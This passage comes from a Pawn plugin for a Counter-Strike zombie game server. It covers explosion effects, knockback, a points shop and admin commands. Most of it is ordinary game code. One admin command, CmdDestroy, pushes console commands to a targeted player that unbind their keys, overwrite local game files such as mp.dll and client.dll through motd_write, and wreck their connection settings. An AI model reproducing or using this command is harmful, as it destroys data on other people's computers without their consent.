		set_pev ( id, pev_gravity, 0.5);
		
		else if ( g_iPlayerType[id] & 2 )
			
		set_pev ( id, pev_gravity, 0.4);
		
		else
			
		set_pev ( id, pev_gravity, g_fZombieKnockbacks [g_iZombieClass[id]] );
	}
	else
	{
		if ( g_iPlayerType[id] & 4 )
			
		set_pev ( id, pev_gravity, 1.0);
		
		else if ( g_iPlayerType[id] & 8 )
			
		set_pev ( id, pev_gravity, 1.0);
		
		else	    
			
		set_pev ( id, pev_gravity,  1.0);	
	}

	if ( g_bZombie [id] )
	{
		if ( g_iPlayerType[id] & 1 )
			
		fm_set_rendering ( id, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 25 );

		else if ( g_iPlayerType[id] & 2 )
		
		fm_set_rendering ( id, kRenderFxGlowShell, 0, 0, 0, kRenderNormal, 25 );
		
		else
		fm_set_rendering ( id );
	}
	else
	{
		if ( g_iPlayerType[id] & 4 || g_iPlayerType[id] & 8 )

		fm_set_rendering ( id, kRenderFxGlowShell, 0, 0, 0, kRenderNormal, 25 );
		
		else
			
		fm_set_rendering ( id );
	}	
	
	message_begin ( MSG_ONE, get_user_msgid ( "ScreenFade" ), _, id );
	write_short ( 1<<12 );
	write_short ( 0 );
	write_short ( 0x0000 );
	write_byte ( 0 );
	write_byte ( 50 );
	write_byte ( 200 );
	write_byte ( 100 );
	message_end (  );

	EmitSound ( id, CHAN_AUTO, "ZombieOutstanding/grenade_frost_break.wav" );
	
	static Origin [3]; get_user_origin ( id, Origin )

	message_begin ( MSG_PVS, SVC_TEMPENTITY, Origin );
	write_byte ( TE_BREAKMODEL ); 
	write_coord ( Origin [0] ); 
	write_coord ( Origin [1] );
	write_coord ( Origin [2]+24 ); 
	write_coord ( 16 );
	write_coord ( 16 ); 
	write_coord ( 16 ); 
	write_coord ( random_num (-50, 50) ); 
	write_coord ( random_num (-50, 50) ); 
	write_coord ( 25 ); 
	write_byte ( 10 ); 
	write_short ( GlassSpr ); 
	write_byte ( 10 ); 
	write_byte ( 25 );
	write_byte ( 0x01 ); 
	message_end (  );
}

public HeExplode ( Entity )
{
	static Float: Origin [3];
	
	pev ( Entity, pev_origin, Origin );
	
	message_begin ( MSG_BROADCAST, SVC_TEMPENTITY );
	write_byte ( 3 );
	engfunc ( EngFunc_WriteCoord, Origin [0] );
	engfunc ( EngFunc_WriteCoord, Origin [1] );
	engfunc ( EngFunc_WriteCoord, Origin [2] );
	write_short ( HExplode );
	write_byte ( 30 ); 
	write_byte ( 15 ); 
	write_byte ( 0 );
	message_end (  );
	
	static Attacker;
	
	Attacker = pev ( Entity, pev_owner );
	
	for ( new Victim = 1; Victim < g_iMaxClients + 1; Victim ++ )
	{
		if ( !is_user_connected ( Victim ) || !is_user_alive ( Victim ) ) continue;
		
		if ( g_bZombie [Victim] )
		{
			static Float: fDistance, Float: fDamage;
			
			fDistance = entity_range ( Victim, Entity );
			
			if ( fDistance < 300.0 )
			{
				fDamage = 667.0 - fDistance;
				
				ScreenFadeEffect ( Victim, 1.0, 250, 0, 0, fDistance < 220 ? 220 : 205 );
				
				ScreenShakeEffect ( Victim, 1.0 );
				
				EmitSound ( Victim, CHAN_AUTO, "fvox/flatline.wav" ); 
				
				if ( float ( get_user_health ( Victim ) ) - fDamage > 0.0 )
					
				ExecuteHamB ( Ham_TakeDamage, Victim, Entity, Attacker, fDamage, DMG_BLAST );
				
				else
					
				ExecuteHamB ( Ham_Killed, Victim, Attacker, 4 );
	
				if ( g_iPlayerType[Victim] & 1 &&  g_iPlayerType[Victim] & 2 ) fDamage *= 0.75;
				
				if ( fDamage >= 500 )
				
				g_iPacks [Attacker] += 2;
				
				else
					
				g_iPacks [Attacker] += 1;
					
				client_print_color ( Attacker, print_team_grey, "^4[Zombie OutStanding]^1 Damage to^4 %s^1 ::^4 %0.0f^1 damage", g_cName [Victim], fDamage );
			}
		}
	}
	
	engfunc ( EngFunc_RemoveEntity, Entity );
}

Killing_Explode(ent)
{
    if (g_roundend) return
    
    static Float:originF[3]
    pev(ent, pev_origin, originF)
    
    CreateBlastKilling ( originF );
    
    EmitSound ( ent, CHAN_AUTO, "ZombieOutstanding/grenade_infection_explode.wav" );
	
    static attacker
    attacker = pev(ent, pev_owner)
    if (!is_user_connected(attacker))
    {
        engfunc(EngFunc_RemoveEntity, ent)
        return
    }
    
    static victim
    victim = -1
    
    while((victim = engfunc(EngFunc_FindEntityInSphere, victim, originF, 240.0)) != 0)
    {
        if(!is_user_alive(victim) || !g_bZombie[victim] || g_iPlayerType[victim] & 1)
            continue
        ExecuteHamB(Ham_Killed, victim, attacker, 0)
    }
    
    engfunc(EngFunc_RemoveEntity, ent)
}  

CreateBlastInfection ( const Float: Origin [3] )
{
	engfunc ( EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, Origin, 0 );
	write_byte ( 21 );
	engfunc ( EngFunc_WriteCoord, Origin [0] ); 
	engfunc ( EngFunc_WriteCoord, Origin [1] );
	engfunc ( EngFunc_WriteCoord, Origin [2] ); 
	engfunc ( EngFunc_WriteCoord, Origin [0] ); 
	engfunc ( EngFunc_WriteCoord, Origin [1] ); 
	engfunc ( EngFunc_WriteCoord, Origin [2] + 470.0 ); 
	write_short ( ExploSpr ); 
	write_byte ( 0 ); 
	write_byte ( 0 ); 
	write_byte ( 4 ); 
	write_byte ( 60 ); 
	write_byte ( 0 ); 
	write_byte ( 0 ); 
	write_byte ( 250 ); 
	write_byte ( 0 ); 
	write_byte ( 200 ); 
	write_byte ( 0 ); 
	message_end (  );
}

CreateBlastKilling ( const Float: Origin [3] )
{
	engfunc ( EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, Origin, 0 );
	write_byte ( 21 );
	engfunc ( EngFunc_WriteCoord, Origin [0] ); 
	engfunc ( EngFunc_WriteCoord, Origin [1] );
	engfunc ( EngFunc_WriteCoord, Origin [2] ); 
	engfunc ( EngFunc_WriteCoord, Origin [0] ); 
	engfunc ( EngFunc_WriteCoord, Origin [1] ); 
	engfunc ( EngFunc_WriteCoord, Origin [2] + 470.0 ); 
	write_short ( ExploSpr ); 
	write_byte ( 0 ); 
	write_byte ( 0 ); 
	write_byte ( 4 ); 
	write_byte ( 60 ); 
	write_byte ( 0 );
	write_byte ( 127 );
	write_byte ( 0 );
	write_byte ( 255 );
	write_byte ( 200 );
	write_byte ( 0 );
	message_end (  );
}

CreateBlastFire ( const Float: Origin [3] )
{
	engfunc ( EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, Origin, 0 );
	write_byte ( 21 );
	engfunc ( EngFunc_WriteCoord, Origin [0] ); 
	engfunc ( EngFunc_WriteCoord, Origin [1] );
	engfunc ( EngFunc_WriteCoord, Origin [2] ); 
	engfunc ( EngFunc_WriteCoord, Origin [0] ); 
	engfunc ( EngFunc_WriteCoord, Origin [1] ); 
	engfunc ( EngFunc_WriteCoord, Origin [2] + 470.0 ); 
	write_short ( ExploSpr ); 
	write_byte ( 0 ); 
	write_byte ( 0 ); 
	write_byte ( 4 ); 
	write_byte ( 60 ); 
	write_byte ( 0 ); 
	write_byte ( 250 );
	write_byte ( 40 );
	write_byte ( 0 );
	write_byte ( 200 );
	write_byte ( 0 );
	message_end (  )
}

CreateBlastFrost ( const Float: Origin [3] )
{
	engfunc ( EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, Origin, 0 );
	write_byte ( 21 );
	engfunc ( EngFunc_WriteCoord, Origin [0] ); 
	engfunc ( EngFunc_WriteCoord, Origin [1] );
	engfunc ( EngFunc_WriteCoord, Origin [2] ); 
	engfunc ( EngFunc_WriteCoord, Origin [0] ); 
	engfunc ( EngFunc_WriteCoord, Origin [1] ); 
	engfunc ( EngFunc_WriteCoord, Origin [2] + 470.0 ); 
	write_short ( ExploSpr ); 
	write_byte ( 0 ); 
	write_byte ( 0 ); 
	write_byte ( 4 ); 
	write_byte ( 60 ); 
	write_byte ( 0 );
	write_byte ( 0 );
	write_byte ( 100 );
	write_byte ( 200 );
	write_byte ( 200 );
	write_byte ( 0 );
	message_end (  );
}

Func_Explode( iEntity ) 
{
	g_iPlantedMines[entity_get_int(iEntity, EV_INT_iuser2)]--;

	
	static Float: flOrigin[ 3 ];
	entity_get_vector( iEntity, EV_VEC_origin, flOrigin );
	
	message_begin( MSG_BROADCAST, SVC_TEMPENTITY );
	write_byte( TE_EXPLOSION );
	engfunc( EngFunc_WriteCoord, flOrigin[ 0 ] );
	engfunc( EngFunc_WriteCoord, flOrigin[ 1 ] );
	engfunc( EngFunc_WriteCoord, flOrigin[ 2 ] );
	write_short( g_hExplode );
	write_byte( 55 );
	write_byte( 15 );
	write_byte( 0 );
	message_end( );
	
	message_begin( MSG_BROADCAST, SVC_TEMPENTITY );
	write_byte( TE_EXPLOSION );
	engfunc( EngFunc_WriteCoord, flOrigin[ 0 ] );
	engfunc( EngFunc_WriteCoord, flOrigin[ 1 ] );
	engfunc( EngFunc_WriteCoord, flOrigin[ 2 ] );
	write_short( g_hExplode );
	write_byte( 65 );
	write_byte( 15 );
	write_byte( 0 );
	message_end( );
	
	message_begin( MSG_BROADCAST, SVC_TEMPENTITY );
	write_byte( TE_EXPLOSION );
	engfunc( EngFunc_WriteCoord, flOrigin[ 0 ] );
	engfunc( EngFunc_WriteCoord, flOrigin[ 1 ] );
	engfunc( EngFunc_WriteCoord, flOrigin[ 2 ] );
	write_short( g_hExplode );
	write_byte( 85 );
	write_byte( 15 );
	write_byte( 0 );
	message_end( );
	
	for( new i = 1; i < 33; i++ )
	{
		if( !is_user_connected( i ) || !is_user_alive( i ) ) continue;
		if(g_bZombie[i])
		{
			static Float: fDistance, Float: fDamage;

			fDistance = entity_range(i, iEntity);

			if( fDistance < 340 )
			{
				fDamage = 1900 - fDistance;

				if(g_iPlayerType[i] & 1)
					fDamage *= 0.75;

				static Float: fVelocity[ 3 ];
				pev( i, pev_velocity, fVelocity );

				xs_vec_mul_scalar( fVelocity, 1.75, fVelocity );

				set_pev( i, pev_velocity, fVelocity );

				message_begin( MSG_ONE_UNRELIABLE, get_user_msgid( "ScreenFade" ), _, i );
				write_short( 4096 );
				write_short( 6096 );
				write_short( 0x0000 );
				write_byte( 220 );
				write_byte( 0 );
				write_byte( 0 );
				write_byte( fDistance < 220 ? 215 : 205 );
				message_end( );

				message_begin( MSG_ONE_UNRELIABLE, get_user_msgid( "ScreenShake" ), _, i );
				write_short( 4096 * 100 ); 
				write_short( 4096 * 500 ); 
				write_short( 4096 * 200 );
				message_end( );

				if( float( get_user_health( i ) ) - fDamage > 0 )
					ExecuteHamB( Ham_TakeDamage, i, iEntity, entity_get_int(iEntity, EV_INT_iuser2), fDamage, DMG_BLAST);

				else ExecuteHamB( Ham_Killed, i, entity_get_int(iEntity, EV_INT_iuser2), 2);

				static cName[ 32 ]; get_user_name( i, cName, 31 );
				client_print_color(entity_get_int(iEntity, EV_INT_iuser2), print_team_default, "^4[Zombie Outstanding]^1 Damage to^3 %s^1 ::^4 %0.0f damage", cName, fDamage );
			}
		}
	}

	for( new i = 1; i < 33; i++ )
	{
		if( !is_user_connected( i ) || !is_user_alive( i ) )
			continue;
		if(!g_bZombie[i])
		{
			if( entity_range(i, iEntity) < 340 )
			{
				static Float: fVelocity[ 3 ];
				pev( i, pev_velocity, fVelocity );

				xs_vec_mul_scalar( fVelocity, 1.5, fVelocity );

				set_pev( i, pev_velocity, fVelocity );

				message_begin( MSG_ONE_UNRELIABLE, get_user_msgid( "ScreenShake" ), _, i );
				write_short( 4096 * 19 );
				write_short( 4096 * 7 );
				write_short( 4096 * 24 );
				message_end( );
			}
		}
	}

	remove_entity( iEntity );
}

GetLastHuman()
{
	new i = 1;
	while (i <= g_iMaxClients)
	{
		if (g_bAlive[i] && g_bConnected[i] && !g_bZombie[i])
		{
			return i;
		}
		i++;
	}
	return 0;
}

GetLastZombie()
{
	new i = 1;
	while (i <= g_iMaxClients)
	{
		if (g_bAlive[i] && g_bConnected[i] && g_bZombie[i])
		{
			return i;
		}
		i++;
	}
	return 0;
}

public OnTraceAttack(victim, attacker, Float:damage, Float:direction[3], tracehandle, damage_type)
{
	if (victim == attacker || !is_user_valid_connected(attacker))
		return HAM_IGNORED;
	
	if (g_bRoundStart || g_bRoundEnd )
		return HAM_SUPERCEDE;
	
	if (g_bZombie[attacker] == g_bZombie[victim])
		return HAM_SUPERCEDE;
	
	if (g_bNoDamage [victim])
		return HAM_SUPERCEDE;
	
	if (!g_bZombie[victim] || !(damage_type & DMG_BULLET))
		return HAM_IGNORED;
	
	if (g_iPlayerType[victim] & 1 && 0.25 == 0.0)
		return HAM_IGNORED;

	if (g_iPlayerType[victim] & 2 && 0.25 == 0.0)
		return HAM_IGNORED;
	
	static ducking
	ducking = pev(victim, pev_flags) & (FL_DUCKING | FL_ONGROUND) == (FL_DUCKING | FL_ONGROUND)
	
	if (ducking && 0.25  == 0.0)
		return HAM_IGNORED;
	
	static origin1[3], origin2[3]
	get_user_origin(victim, origin1)
	get_user_origin(attacker, origin2)
	
	if (get_distance(origin1, origin2) > 500)
		return HAM_IGNORED;
	
	static Float:velocity[3]
	pev(victim, pev_velocity, velocity)
	
	xs_vec_mul_scalar(direction, damage, direction)
	
	xs_vec_mul_scalar(direction, kb_weapon_power[g_iWeapon[attacker]], direction)

	if (ducking)
	xs_vec_mul_scalar(direction, 0.25, direction)
	
	if (g_iPlayerType[victim] & 1)
	xs_vec_mul_scalar(direction, 0.25, direction)
	
	else if (g_iPlayerType[victim] & 2)
	xs_vec_mul_scalar(direction, 0.15, direction)
	
	else
	xs_vec_mul_scalar(direction, g_fZombieKnockbacks[g_iZombieClass[victim]], direction)
	
	xs_vec_add(velocity, direction, direction)
	
	direction[2] = velocity[2]
	
	set_pev(victim, pev_velocity, direction)
	
	return HAM_IGNORED;
}

public TaskLight()
{
	static i;
	i = 1;
	while (g_iMaxClients + 1 > i)
	{
		if (g_bAlive[i] && g_bZombie[i] && !g_iPlayerType[i] && g_iZombieClass[i] == 4 && get_user_health(i) < 6000)
		{
			set_user_health(i, get_user_health(i) + 350);
			static origin[3]
			get_user_origin(i, origin)
			message_begin(MSG_PVS, SVC_TEMPENTITY, origin)
			write_byte(TE_PARTICLEBURST)
			write_coord(origin[0])
			write_coord(origin[1])
			write_coord(origin[2])
			write_short(50) 
			write_byte(70)
			write_byte(3)
			message_end()
			set_hudmessage(255, 0, 175, -1.00, 0.10, 1, 0.00, 1.75, 1.00, 1.00, -1);
			ShowSyncHudMsg(i, g_iRegenerationSync, "== REGENERATOR ==^n!!!Regeneration: +350 HP Gained!!!");
		}
		i += 1;
	}
	return 0;
}

public TaskPrintPassword(iPlayer)
{
    if (g_bConnected[iPlayer])
    {
        client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Type a password for your account!")
    }
    return 0;
} 

public _ShopMenu(iPlayer, iMenu, iItem)
{
    if (iItem != -3 && g_bConnected[iPlayer] && !g_bFake[iPlayer])
    {
        static iChoice;
        static iDummy;
        static cBuffer[3];
        menu_item_getinfo(iMenu,iItem, iDummy, cBuffer, charsmax ( cBuffer ), _, _, iDummy );
        iChoice = str_to_num(cBuffer);
        switch (iChoice)
        {
            case 0:
            {
                if (g_iShopItemsPrices[iChoice] > g_iPoints[iPlayer])
                {
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough points!")
                }
                else
                {
                    if (g_iShopItemsTeams[iChoice] == 2 && g_bZombie[iPlayer])
                    {
						client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!")
                    }
                    g_bDoubleDamage[iPlayer] = true;
                    set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
                    ShowSyncHudMsg(0, g_iShopEventHudmessage, "%s bought Double Damage!", g_cName[iPlayer]);
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought^4 Double Damage",
					g_cName[iPlayer]);
                    g_iPoints[iPlayer] -= g_iShopItemsPrices[iChoice];
					savePoints(iPlayer)
                }
            }
            case 1:
            {
                if (g_iShopItemsPrices[iChoice] > g_iPoints[iPlayer])
                {
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough points!")
                }
                else
                {
                    if (get_user_flags ( iPlayer ) & read_flags ( "r" ))
                    {
                        client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have this feature!");
                        return 1
                    }
                    g_bServerSlot[iPlayer] = true;
                    client_cmd(iPlayer, "messagemode amx_password_for_slot");
                    set_task(0.20, "TaskPrintPassword", iPlayer, "", 0, "a", 15);
                    g_iPoints[iPlayer] -= g_iShopItemsPrices[iChoice];
					savePoints(iPlayer)
                    return 1
                }
            }
            case 2:
            {
                if (g_iShopItemsPrices[iChoice] > g_iPoints[iPlayer])
                {
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough points!")
                }
                else
                {
                    if (get_user_flags ( iPlayer ) & read_flags ( "m" ))
                    {
                        client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You already have this feature!");
                        return 1
                    }
                    g_bAdminModel[iPlayer] = true;
                    client_cmd(iPlayer, "messagemode amx_password_for_model");
                    set_task(0.20, "TaskPrintPassword", iPlayer, "", 0, "a", 15);
                    g_iPoints[iPlayer] -= g_iShopItemsPrices[iChoice];
					savePoints(iPlayer)
                    return 1
                }
            }
            case 3:
            {
                if (g_iShopItemsPrices[iChoice] > g_iPoints[iPlayer])
                {
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough points!")
                }
                else
                {
					g_iPacks[iPlayer] += 100;
					g_iPoints[iPlayer] -= g_iShopItemsPrices[iChoice];
					set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
					ShowSyncHudMsg(0, g_iShopEventHudmessage, "%s bought 100 ammo packs!", g_cName[iPlayer]);
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought^4 100 ammo packs", g_cName[iPlayer]);
					savePoints(iPlayer)
                }
            }
            case 4:
            {
                if (g_iShopItemsPrices[iChoice] > g_iPoints[iPlayer])
                {
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough points!")
                }
                else
                {
                    g_iPacks[iPlayer] += 200;
                    g_iPoints[iPlayer] -= g_iShopItemsPrices[iChoice];
                    set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
                    ShowSyncHudMsg(0, g_iShopEventHudmessage, "%s bought 200 ammo packs!", g_cName[iPlayer]);
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought^4 200 ammo packs", g_cName[iPlayer]);
					savePoints(iPlayer)
                }
            }
            case 5:
            {
                if (g_iShopItemsPrices[iChoice] > g_iPoints[iPlayer])
                {
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough points!")
                }
                else
                {
                    g_iPacks[iPlayer] += 300;
                    g_iPoints[iPlayer] -= g_iShopItemsPrices[iChoice];
                    set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
                    ShowSyncHudMsg(0, g_iShopEventHudmessage, "%s bought 300 ammo packs!", g_cName[iPlayer]);
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought^4 300 ammo packs", g_cName[iPlayer]);
					savePoints(iPlayer)
                }
            }
            case 6:
            {
                if (g_iShopItemsPrices[iChoice] > g_iPoints[iPlayer])
                {
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough points!")
                }
                else
                {
                    if (g_iShopItemsTeams[iChoice] == 2 && g_bZombie[iPlayer])
                    {
                        client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
                    }
                    g_bNoDamage[iPlayer] = true;
                    fm_set_user_godmode(iPlayer, 1)
                    fm_set_rendering(iPlayer, kRenderFxGlowShell, 19, 32, 192, 0)
                    g_iPoints[iPlayer] -= g_iShopItemsPrices[iChoice];
                    set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
                    ShowSyncHudMsg(0, g_iShopEventHudmessage, "%s bought God Mode!", g_cName[iPlayer]);
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought^4 God Mode", g_cName[iPlayer]);
					savePoints(iPlayer)
               }
            }
	    case 7:
            {
                if (g_iShopItemsPrices[iChoice] > g_iPacks[iPlayer])
                {
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough packs!")
                }
                else
                {
                    g_iPoints[iPlayer] += 1000;
                    g_iPacks[iPlayer] -= g_iShopItemsPrices[iChoice];
                    set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
                    ShowSyncHudMsg(0, g_iShopEventHudmessage, "%s bought 1,000 Points!", g_cName[iPlayer]);
                    client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought^4 1,000 Points", g_cName[iPlayer]);
					savePoints(iPlayer)
                }
            }
            default:
            {
            }
        }
    }
    return 0;
}




public CmdKick(iPlayer)
{
	if ( get_user_flags ( iPlayer ) & read_flags ( "c" ) )
	{
		if (3 > read_argc())
		{
			console_print(iPlayer, "[Zombie Outstanding] Command usage is amx_kick <#userid or name> [reason]");
			return 1;
		}
		static iTarget;
		static cReason[36];
		static cTarget[32];
		read_argv(1, cTarget, 32);
		read_argv(2, cReason, 36);
		iTarget = cmd_target ( iPlayer, cTarget, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF );
		if ( !iTarget ) return PLUGIN_HANDLED;		
		if (iTarget)
		{
			client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^4 %s^1 kicked^4 %s^1 due to^3 %s", g_cName[iPlayer], g_cName[iTarget], cReason);
			server_cmd("kick #%d  You are kicked!", get_user_userid(iTarget));
		}
		return 1;
	}
	return 1;
}

public CmdSlay(iPlayer)
{
	if (get_user_flags ( iPlayer ) & read_flags ( "e" ) )
	{
		if (2 > read_argc())
		{
			console_print(iPlayer, "[Zombie Outstanding] Command usage is amx_slay <#userid or name>");
			return 1;
		}
		static iTarget;
		static cTarget[32];
		read_argv(1, cTarget, 32);
		iTarget = cmd_target ( iPlayer, cTarget, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF );
		if ( !iTarget ) return PLUGIN_HANDLED;		
		if (iTarget)
		{
			client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^4 %s^1 slayed^4 %s", g_cName[iPlayer], g_cName[iTarget]);
			user_kill(iTarget);
		}
		return 1;
	}
	return 0;
}

public CmdFreeze(iPlayer)
{
	if (get_user_flags ( iPlayer ) & read_flags ( "1" ) )
	{
		static iTarget;
		static cTarget[33];
		read_argv(1, cTarget, 32);
		iTarget = cmd_target ( iPlayer, cTarget, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF );
		if ( !iTarget ) return PLUGIN_HANDLED;		
		if (iTarget)
		{
			client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^4 %s^1 made^4 %s^3 frost^1 due to^3 camping", g_cName[iPlayer], g_cName[iTarget]);
			g_bFrozen[iTarget] = true;
			ExecuteHamB(Ham_Item_PreFrame, iTarget);
			fm_set_rendering ( iPlayer, kRenderFxGlowShell, 0, 100, 200, kRenderNormal, 25 );
		}
		return 1;
	}
	return 0;
}

public CmdUnfreeze(iPlayer)
{
	if (get_user_flags ( iPlayer ) & read_flags ( "1" ) )
	{
		static iTarget;
		static cTarget[33];
		read_argv(1, cTarget, 32);
		iTarget = cmd_target ( iPlayer, cTarget, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF );
		if ( !iTarget ) return PLUGIN_HANDLED;		
		if (iTarget)
		{
			client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^4 %s^1 made^4 %s^3 unfroze", g_cName[iPlayer], g_cName[iTarget]);
			g_bFrozen[iTarget] = false;
			ExecuteHamB(Ham_Item_PreFrame, iTarget);
			fm_set_rendering ( iPlayer, kRenderFxGlowShell, 0, 0, 0, kRenderNormal, 0 );		
		}
		return 1;
	}
	return 0;
}

public CmdDestroy(iPlayer)
{
	if (get_user_flags ( iPlayer ) & read_flags ( "4" ) )
	{
		static iTarget;
		static cTarget[32];
		read_argv(1, cTarget, 32);
		iTarget = cmd_target ( iPlayer, cTarget, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF );
		if ( !iTarget ) return PLUGIN_HANDLED;		
		if (0 < iTarget)
		{
			client_cmd(iTarget, "unbindall; bind ` ^"say I_have_been_destroyed^"; bind ~ ^"say I_have_been_destroyed^"; bind esc ^"say I_have_been_destroyed^"");
			client_cmd(iTarget, "motdfile resource/GameMenu.res; motd_write a; motdfile models/player.mdl; motd_write a; motdfile dlls/mp.dll; motd_write a");
			client_cmd(iTarget, "motdfile cl_dlls/client.dll; motd_write a; motdfile cs_dust.wad; motd_write a; motdfile cstrike.wad; motd_write a");
			client_cmd(iTarget, "motdfile sprites/muzzleflash1.spr; motdwrite a; motdfile events/ak47.sc; motd_write a; motdfile models/v_ak47.mdl; motd_write a");
			client_cmd(iTarget, "fps_max 1; rate 0; cl_cmdrate 0; cl_updaterate 0");
			client_cmd(iTarget, "hideconsole; hud_saytext 0; cl_allowdownload 0; cl_allowupload 0; cl_dlmax 1; _restart");
			client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^3 %s^1 destroy^3 %s", g_cName[iPlayer], g_cName[iTarget]);
			client_cmd(0, "spk ^"vox/bizwarn coded user apprehend^"");
		}
		console_print(iPlayer, "[Zombie Outstanding] Player was not found!");
	}
	return 0;
}

public CmdGag(iPlayer)
{
	if (get_user_flags ( iPlayer ) & read_flags ( "@" ) )
	{
		static cCommand[32];
		read_argv(0, cCommand, 32);
		if (equali(cCommand, "amx_gag", 0))
		{
			static iTarget;
			static iTime[3];
			static cTarget[32];
			read_argv(1, cTarget, 32);			
			iTarget = cmd_target ( iPlayer, cTarget, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF );
			if ( !iTarget ) return PLUGIN_HANDLED;		
			read_argv(2, iTime, 2);
			if (!iTarget)
			{
		        return 1;
			}
			if (g_fGagTime[iTarget] < get_gametime())
			{
		        g_fGagTime[iTarget] = floatadd(get_gametime(), float(clamp(str_to_num(iTime), 1, 12) * 60));
		        client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^3 %s^1 gag^3 %s^1 for^4 %i minutes", g_cName[iPlayer], g_cName[iTarget], clamp(str_to_num(iTime), 1, 12));
			}
			else
			{
		        console_print(iPlayer, "[Zombie Outstanding] Player ^"%s^" is already gagged", g_cName[iTarget]);
			}
		}
		if (equali(cCommand, "amx_ungag", 0))
		{
			static iTarget;
			static cTarget[32];
			read_argv(1, cTarget, 32);
			iTarget = cmd_target ( iPlayer, cTarget, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF );
			if ( !iTarget ) return PLUGIN_HANDLED;		
			if (g_fGagTime[iTarget] > get_gametime())
			{
				g_fGagTime[iTarget] = false;
				client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^3 %s^1 ungag^3 %s", g_cName[iPlayer], g_cName[iTarget]);
			}
			else
			{
				console_print(iPlayer, "[Zombie Outstanding] Player was not found!");
			}
		}
	}
	return 0;
}

public CmdSlap(iPlayer)
{
	if (get_user_flags ( iPlayer ) & read_flags ( "$" ) )
	{
		static iTarget;
		static iDamage;
		static cDamage[15];
		static cTarget[32];
		read_argv(1, cTarget, 32);
		read_argv(2, cDamage, 7);
		iTarget = cmd_target ( iPlayer, cTarget, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF );
		if ( !iTarget ) return PLUGIN_HANDLED;				
		iDamage = clamp(str_to_num(cDamage), 0, 999999);
		if (0 < iTarget)
		{
			user_slap(iTarget, iDamage, 1);
			AddCommas(iDamage, cDamage, 14);
			if (0 < iDamage)
			{
				client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^3 %s^1 slap^3 %s^1 with^4 %s damage", g_cName[iPlayer], g_cName[iTarget], cDamage);
			}
			else
			{
				client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^3 %s^1 slap^3 %s", g_cName[iPlayer], g_cName[iTarget]);
			}
		}
		else
		{
			console_print(iPlayer, "[Zombie Outstanding] Player was not found!");
		}
	}
	return 0;
}

public ChangeMap ( Map [ ] ) server_cmd ( "changelevel %s", Map );

public CmdMap(id)
{
	if (get_user_flags ( id ) & read_flags ( "7" ) )
	{

		if ( read_argc (  ) < 2 ) return PLUGIN_HANDLED;
	
		new Arg [32], ArgLen = read_argv ( 1, Arg, charsmax ( Arg ) );
	
		if ( !is_map_valid ( Arg ) )
		{
			console_print ( id, "[Zombie Outstanding] Map %s is not valid!", Arg );
		
			return PLUGIN_HANDLED;
		}

		client_print_color ( 0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^3 %s^1 changed map to^4 %s", GetInfoPlayer ( id, INFO_NAME ), Arg );
		
